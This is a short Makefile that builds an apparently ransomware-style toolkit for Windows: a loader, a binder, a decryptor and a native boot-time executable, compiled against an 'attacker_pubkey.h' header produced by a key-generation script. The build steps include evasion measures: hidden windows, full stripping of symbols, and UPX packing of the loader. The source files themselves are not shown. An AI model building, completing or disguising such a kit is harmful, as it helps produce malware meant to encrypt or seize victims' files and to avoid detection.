CC = x86_64-w64-mingw32-gcc
CFLAGS = -Os -s -Wall
LIBS = -lcrypt32 -ladvapi32 -lgdi32 -luser32 -lnetapi32

all: attacker_pubkey.h felty_loader.exe felty_binder.exe felty_decrypt.exe felty_boot.exe

attacker_pubkey.h: felty_keygen.py
	python3 felty_keygen.py

felty_loader.exe: felty_loader.c attacker_pubkey.h
	$(CC) $(CFLAGS) -o felty_loader.exe felty_loader.c $(LIBS) -mwindows
	strip --strip-all felty_loader.exe
	upx --best felty_loader.exe 2>/dev/null || true

felty_binder.exe: felty_binder.c
	$(CC) $(CFLAGS) -o felty_binder.exe felty_binder.c $(LIBS) -mwindows
	strip --strip-all felty_binder.exe

felty_boot.exe: felty_boot.c
	$(CC) -Os -s -nostdlib -Wl,--subsystem,native -e _NtProcessStartup \
		-o felty_boot.exe felty_boot.c -lntdll
	strip --strip-all felty_boot.exe

felty_decrypt.exe: felty_decrypt.c
	$(CC) $(CFLAGS) -municode -o felty_decrypt.exe felty_decrypt.c -lcrypt32 -ladvapi32
	strip --strip-all felty_decrypt.exe

clean:
	rm -f *.exe attacker_pubkey.h *.o
